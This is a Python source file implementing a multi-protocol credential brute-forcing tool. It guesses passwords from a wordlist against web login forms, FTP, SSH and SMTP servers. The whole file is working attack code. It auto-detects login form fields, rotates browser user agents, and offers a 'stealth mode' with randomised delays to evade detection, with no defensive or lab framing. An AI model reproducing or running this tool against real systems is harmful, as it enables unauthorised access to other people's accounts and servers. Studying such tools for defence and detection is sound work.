import time
import ftplib
import smtplib
import paramiko
import requests
import random
from bs4 import BeautifulSoup

# User agent list for HTTP requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
]

class BruteForceAttacker:
    def __init__(self, delay=1, stealth_mode=False, log_callback=None):
        self.delay = delay
        self.stealth_mode = stealth_mode
        self.log_callback = log_callback or print

    def log(self, message):
        self.log_callback(message)

    def run_attack(self, target, username, wordlist_path, protocol, port=0):
        protocol = protocol.lower()
        self.log(f"[+] Starting brute force on {protocol.upper()} using username '{username}'...")
        if protocol == "http":
            self.http_attack(target, username, wordlist_path)
        elif protocol == "ftp":
            self.ftp_attack(target, username, wordlist_path, port or 21)
        elif protocol == "ssh":
            self.ssh_attack(target, username, wordlist_path, port or 22)
        elif protocol == "smtp":
            self.smtp_attack(target, username, wordlist_path, port or 587)
        else:
            self.log(f"[-] Unsupported protocol: {protocol}")

    def http_attack(self, target, username, wordlist_path):
        try:
            session = requests.Session()
            response = session.get(target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            if not form:
                self.log("[-] No form found on page.")
                return

            action = form.get('action')
            method = form.get('method', 'post').lower()
            login_url = target if not action else requests.compat.urljoin(target, action)
            input_fields = form.find_all('input')
            data = {}
            user_field = pass_field = None

            for inp in input_fields:
                name = inp.get('name')
                if not name:
                    continue
                lname = name.lower()
                if not user_field and lname in ['uname', 'username', 'user', 'login', 'email']:
                    user_field = name
                elif not pass_field and lname in ['pass', 'password', 'pwd']:
                    pass_field = name
                else:
                    data[name] = inp.get('value', '')

            if not user_field or not pass_field:
                self.log(f"[-] Username or password field not found. Fields found: {[inp.get('name') for inp in input_fields]}")
                return

            with open(wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f]

            original_response = session.get(target)
            original_length = len(original_response.text)

            for password in passwords:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS)
                }
                data[user_field] = username
                data[pass_field] = password

                if method == "post":
                    attempt = session.post(login_url, data=data, headers=headers, timeout=10)
                else:
                    attempt = session.get(login_url, params=data, headers=headers, timeout=10)

                if attempt.status_code in [301, 302]:
                    self.log(f"[+] Success (redirect): {username}: {password}")
                    return
                elif "logout" in attempt.text.lower() or "dashboard" in attempt.text.lower():
                    self.log(f"[+] Success (keyword match): {username}: {password}")
                    return
                elif len(attempt.text) != original_length:
                    self.log(f"[+] Success (length mismatch): {username}: {password}")
                    return
                else:
                    self.log(f"[-] Failed: {password}")

                time.sleep(self.delay + random.uniform(0.5, 1.5) if self.stealth_mode else self.delay)

            self.log("[!] Brute-force completed. No valid password found.")
        except Exception as e:
            self.log(f"[!] Error during HTTP brute force: {e}")

    def ftp_attack(self, target, username, wordlist_path, port=21):
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=5)
                ftp.login(username, password)
                self.log(f"[+] Success: {username}: {password}")
                ftp.quit()
                return
            except ftplib.error_perm:
                self.log(f"[-] Failed: {password}")
            except Exception as e:
                self.log(f"[!] FTP error: {e}")
            time.sleep(self.delay)
        self.log("[!] Brute-force completed. No valid password found.")

    def ssh_attack(self, target, username, wordlist_path, port=22):
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username=username, password=password, timeout=5)
                self.log(f"[+] Success: {username}: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                self.log(f"[-] Failed: {password}")
            except Exception as e:
                self.log(f"[!] SSH error: {e}")
            time.sleep(self.delay)
        self.log("[!] Brute-force completed. No valid password found.")

    def smtp_attack(self, target, username, wordlist_path, port=587):
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
        for password in passwords:
            try:
                server = smtplib.SMTP(target, port, timeout=5)
                server.starttls()
                server.login(username, password)
                self.log(f"[+] Success: {username}: {password}")
                server.quit()
                return
            except smtplib.SMTPAuthenticationError:
                self.log(f"[-] Failed: {password}")
            except Exception as e:
                self.log(f"[!] SMTP error: {e}")
            time.sleep(self.delay)
        self.log("[!] Brute-force completed. No valid password found.")
